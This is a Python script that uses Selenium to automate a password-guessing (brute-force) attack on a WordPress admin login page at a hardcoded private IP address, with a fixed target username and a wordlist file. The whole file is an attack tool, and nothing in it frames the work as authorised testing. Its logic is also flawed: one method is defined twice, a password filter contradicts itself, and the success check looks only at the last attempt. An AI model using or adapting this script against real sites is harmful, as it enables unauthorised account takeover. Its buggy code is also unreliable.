# Lets you attempt a wordpress admin panel login automatically

from selenium import webdriver
import time
class Login:

    URL = 'http://10.225.147.147/wp-login.php'
    passwordDictionary = []
    wordlist = open("encodedwordlistt.txt")
    charList = "abcdefghijklmnopqrstuwxkyz-!"
    username = "chrisb14"
    password = "test"
    websiteDriver = None
    service = None

    def check(self, newWord):
        count = 0
        count2 = 0
        for character in newWord:
            if character.isdigit():
                count += 1
                if count == 0:
                    return True
                else:
                    return False
            if character.isupper():
                count2 += 1
                if not count2 == 0:
                    return True
                else:
                    return False
        if len(newWord) >= 8:
            return False
        else:
            return True

    def fileToArrayConverter(self):
        for word in self.wordlist:
            wordconv1 = word.split(" ")
        for newWord in wordconv1:
            if self.check(newWord):
                print(newWord)
                self.passwordDictionary.append(newWord)

    def __init__(self):
        self.websiteDriver = webdriver.Chrome()
        self.fileToArrayConverter()
        #self.generatePasswords()

    def fileToArrayConverter(self):
        for word in self.wordlist:
            wordconv1 = word.split(" ")
            for newWord in wordconv1:
                self.passwordDictionary.append(newWord)

    def bruteForcer(self):
        self.websiteDriver.get(self.URL)

        for password in self.passwordDictionary:
            if len(password) > 3:
                time.sleep(0.2)
                # Clears the username field so that it does not appear double (happens when the wordpress password is wrong)
                self.websiteDriver.find_element_by_id("user_login").clear()
                username_input = self.websiteDriver.find_element_by_id("user_login")
                username_input.send_keys(self.username)

                password_input = self.websiteDriver.find_element_by_id("user_pass")
                password_input.send_keys(password)

                login_attempt = self.websiteDriver.find_element_by_xpath("//*[@type='submit']")
                login_attempt.submit()
                self.password = password
        if self.websiteDriver.find_element_by_id("wp-submit"):
            print("The login was unsuccessful with password " + self.password + " and the username " + self.username)
        else:
            print("The login was successful! the password for user: " + self.username + " is: " + self.password)
        self.websiteDriver.save_screenshot('screen.png')
        self.websiteDriver.quit()


Login().bruteForcer()


"""
    def generatePasswords(self):
        for current in range(4):
            self.passwordDictionary = [i for i in self.charList]
            for y in range(current):
                self.passwordDictionary = [current + i for i in self.charList for current in self.passwordDictionary]
"""